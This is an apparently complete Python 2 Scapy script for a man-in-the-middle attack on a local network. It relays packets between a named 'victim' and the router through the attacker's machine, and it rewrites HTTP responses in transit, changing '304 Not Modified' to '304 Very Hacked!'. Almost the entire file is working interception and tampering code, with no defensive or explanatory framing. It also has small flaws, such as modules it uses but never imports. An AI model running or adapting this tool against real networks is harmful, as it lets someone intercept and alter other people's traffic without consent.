from scapy.all import *
from uuid import getnode as get_mac
import argparse
import signal
import sys
import logging
import time
s = conf.L2socket(iface='eth0')
victimIP=""
routerIP=""
victimMAC=""
routerMAC=""
myMAC=""
interface=""
def parse_args():
	parser = argparse.ArgumentParser()
	parser.add_argument("-v", "--victimIP", help="Choose the victim IP address. Example: -v 192.168.0.5")
	parser.add_argument("-r", "--routerIP", help="Choose the router IP address. Example: -r 192.168.0.1")
	parser.add_argument("-vmac", "--victimMAC", help="Choose the victim MAC address. Example: -vmac 00:11:22:33:44:55")
	parser.add_argument("-rmac", "--routerMAC", help="Choose the router MAC address. Example: -rmac 11:22:33:44:55:66")
	parser.add_argument("-mmac", "--myMAC", help="my (attacker) MAC. Example: -mmac 11:22:33:44:55:66")
	parser.add_argument("-i", "--interface", help="interface to listen on Example: eth0")
	return parser.parse_args()

def get_mac_from_ip(ip):
	#os.system('ping -c 1 '+ip+' > /dev/null')
	mac = subprocess.check_output("arp -a "+ip+" | awk '{print $4}'", shell=True)
	if(mac == "<incomplete>\n"):
		sys.exit("Error: could not find Mac Address for IP: "+ip)
	if(mac == "entries\n"):
		sys.exit("Error: could not contact network for IP: "+ip)
	return mac
def get_my_mac():
	mac = get_mac()
	mac=':'.join(("%012X" % mac)[i:i+2] for i in range(0, 12, 2))
	if(mac == None):
		sys.exit("Could not determine this machines Mac Address. Try specifying it manually with -mmac")
	return mac
def callback(pkt):
	#print pkt[IP].dst	
	#modify packet here
        if("TCP" in pkt and "Raw" in pkt):
		#print "TEST1"
		if(pkt[TCP].sport==80):
			#print "TEST"
			payload = pkt[Raw].load
			#print payload
			if(payload.find("304 Not Modified") != -1):
				#print payload
				old_len = len(payload)
				payload = payload.replace("304 Not Modified","304 Very Hacked!")
				pkt[Raw].load=payload
				#print payload
				del pkt[IP].chksum
				del pkt[TCP].chksum
				del pkt[IP].len
				#fix seq number
				#print "old_seq: "+str(pkt[TCP].seq)
				#print "old_len: "+str(old_len)
				pkt[TCP].seq=pkt[TCP].seq - old_len + len(payload)
				#print "new_seq: "+str(pkt[TCP].seq)
				#print "new_len: "+str(len(pkt[TCP].payload))
				#pkt = packet.__class__(str(pkt))
				#del pkt[TCP].seq
				#del pkt[TCP].ack
		#print pkt[Raw].load
	if("Raw" in pkt):
		if(pkt[Raw].load.find("Hacked") != -1):
			print pkt[Raw]

	if pkt[IP].dst == victimIP and pkt.dst == myMAC:
		pkt.dst=victimMAC
		pkt.src=myMAC
		#fragments large packets
		if(len(pkt) > 1514):
			#print len(pkt)
			pkt = fragment(pkt)
			for p in pkt:
				s.send(p)
		else:
			s.send(pkt)
	elif pkt[IP].dst == routerIP and pkt.dst == myMAC:
		pkt.dst=routerMAC
		pkt.src=myMAC
		#fragments large packets
		if(len(pkt) > 1514):
			#print len(pkt)
			pkt = fragment(pkt)
			for p in pkt:
				s.send(p)
		else:
			s.send(pkt)

def main(args):
	if os.geteuid() != 0:
		sys.exit("[!] Please run as root")
	global routerIP
	global victimIP
	global routerMAC
	global victimMAC
	global myMAC
	global interface
	routerIP= args.routerIP
	victimIP = args.victimIP
	routerMAC = args.routerMAC
	victimMAC = args.victimMAC
	if(routerMAC == None):
		routerMAC = get_mac_from_ip(routerIP)
	if(victimMAC == None):
		victimMAC = get_mac_from_ip(victimIP)
	myMAC = args.myMAC
	if(myMAC == None):
		myMAC = get_my_mac()
	interface = args.interface
	if(interface == None):
		interface = "eth0"
	print "Forwarding for router with IP: "+routerIP+"  Mac Address: "+routerMAC
	print "Forwarding for victim with IP: "+victimIP+"  Mac Address: "+victimMAC
	filter_text = "ip and ether dst host " + myMAC + " and(dst net " + victimIP  + " or dst net " + routerIP  + ")"
	sniff(filter=filter_text, prn=callback, store=0, iface=interface)
main(parse_args())



